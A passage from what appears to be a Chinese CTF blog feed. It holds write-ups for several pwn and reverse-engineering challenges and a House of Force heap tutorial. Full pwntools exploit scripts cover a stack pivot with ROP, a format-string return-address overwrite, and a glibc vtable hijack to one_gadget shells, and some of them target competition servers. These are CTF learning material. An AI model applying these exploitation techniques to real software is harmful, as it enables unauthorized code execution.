r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:    test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (&quot;/media/psf/mypwn/no5space/pwn&quot;)0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre><ul><li>调试发现第一次read，可以leak canary 和一个栈地址，从而可以根据偏移算出栈上其他有用的地址。</li><li>第二次，需要填充一下canary，然后可以去攻击ret address</li></ul><p>但是，并没有拿到libc的地址，是无法拿到shell。<strong>由于可以溢出的字节有限，也没法进行rop。</strong></p><h3 id="获取libc地址"><a href="#获取libc地址" class="headerlink" title="获取libc地址"></a>获取libc地址</h3><p>此时，根据前面泄漏的栈地址，可以算出read函数的buf栈地址，然后<strong>栈迁移</strong>上去，然后进行rop来leak 出libc地址。</p><p>拿到libc地址以后，rop的终结地址为程序的<code>start</code>。让其清理栈，再次进行程序的漏洞利用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;121.36.59.116&#39;,9999)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &quot;1&quot; * 0x57 + &#39;a&#39;sla(&quot;&gt;&quot;,payload)ru(&#39;a&#39;)canary = uu64(r(8)) - 0x0aprint(hex(canary))s_base = uu64(r(6)) - 0x70print(hex(s_base))  pop_rsi_pop_r15_ret = 0x0000000000400921pop_rbp_ret = 0x0000000000400690pop_rdi_ret = 0x0000000000400923leave_ret = 0x0000000000400879rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)# debug()sa(&quot;&gt;&quot;,payload)r(1)libc_base = uu64(r(6)) - libc.symbols[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&quot;&gt;&quot;,&#39;1&#39;)ru(&#39;1&#39;)rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1])sla(&quot;&gt;&quot;,payload)itr()</code></pre><ul><li>注意在第二次发送payload不要发出去换行符。</li><li>最后一次payload 中的rop什么的都是抄第一次的payload，只是把最后的ret address 改成 one gadget 。（只是填充字节用的）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;“第五空间”-智能安全大赛&quot;&gt;&lt;a href=&quot;#“第五空间”-智能安全大赛&quot; class=&quot;headerlink&quot; title=&quot;“第五空间” 智能安全大赛&quot;&gt;&lt;/a&gt;“第五空间” 智能安全大赛&lt;/h1&gt;&lt;p&gt;比赛时当天有考试，就做了个签道题。&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(6th)</title>
    <link href="http://chumen77.xyz/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <id>http://chumen77.xyz/2020/06/27/DASCTF安恒月赛(6th)/</id>
    <published>2020-06-27T14:27:37.170Z</published>
    <updated>2020-06-28T12:43:13.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p><h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>这里面需要注意的就是开头的：</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>其中这种二进制字节码对应的翻译结果：</p><pre><code>0x64 操作为LOAD_CONST，用法举例：LOAD_CONST 1        HEX: 6401000x71 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE 14                HEX: 710e000x65 操作为LOAD_NAME，用法举例：LOAD_NAME 1                HEX: 650100</code></pre><p>所以寻找：</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>那很明显混淆字段就是：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>然后用工具删除即可，其中0x97就是<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p><h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>反编译后这题就十分简单了。</p><p>给的字符串把“a”，去除后解码base64即可。</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5一下即可。</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sla(&quot;input&quot;,&quot;1&quot;)sla(&quot;input&quot;,&quot;2&quot;)sla(&quot;input&quot;,&quot;3&quot;)sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)sleep(0.1)ru(&quot;0x&quot;)tag = int(r(12),16) - 0xe0ru(&quot;AAAA0x&quot;)libc_base = int(r(12),16) -0x21b97info_addr(&quot;libc_base&quot;,libc_base)key1 = hex(tag)[-4:]print(key1)payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))sla(&quot;input&quot;,payload)sleep(5)rec = rce18[1] + libc_basekey2 = hex(rec)[-4:]print(key2)payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))sla(&quot;input&quot;,payload)sleep(5)key3 = int(hex(tag)[-2:],16) + 2print(key3)payload = &#39;%{}c%13$hhn&#39;.format(key3)sla(&quot;input&quot;,payload)sleep(5)key4 = hex(rec)[-6:-4]print(key4)payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))sla(&quot;input&quot;,payload)itr()# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)# 0008| 0x7fffffffe2f8 --&gt; 0x55554780# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)# 0048| 0x7fffffffe320 --&gt; 0x1# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)# 0080| 0x7fffffffe340 --&gt; 0x0# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1# 0112| 0x7fffffffe360 --&gt; 0x0# 0120| 0x7fffffffe368 --&gt; 0x0# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42# 0144| 0x7fffffffe380 --&gt; 0x0# 0152| 0x7fffffffe388 --&gt; 0x0# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</code></pre><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p><p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p><h4 id="fclose-函数调用的-vtable-函数"><a href="#fclose-函数调用的-vtable-函数" class="headerlink" title="fclose 函数调用的 vtable 函数"></a>fclose 函数调用的 vtable 函数</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable 函数 指针：</p><pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};</code></pre><p>对于攻击的vtable 函数 指针其中的：</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p><h4 id="libc2-29中的vtable"><a href="#libc2-29中的vtable" class="headerlink" title="libc2.29中的vtable"></a>libc2.29中的vtable</h4><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p><p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p><p>正是因为可以写，所以这个题难度就降低了很多。</p><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr的vtable</code>上<code>__finish__</code>指针修改为one gadget。<br>（这里的one gadget，需要自己多试）。</p><h5 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h5><p>第2次的2字节读入可以直接用其本来地址末2字节即可，直接在<code>__IO_2_1_stderr的vtable</code>不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个<code>\x60</code>一个字节即可。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-6th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-6th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(6th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(6th)&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#R
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="http://chumen77.xyz/2020/05/13/House%20of%20Force/"/>
    <id>http://chumen77.xyz/2020/05/13/House of Force/</id>
    <published>2020-05-13T13:30:55.952Z</published>
    <updated>2020-08-13T13:22:05.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li></ul><p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p><pre><code>// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p><h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。</p><p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p><h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li><li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li><li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25784)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;item name:&#39;,str(size))    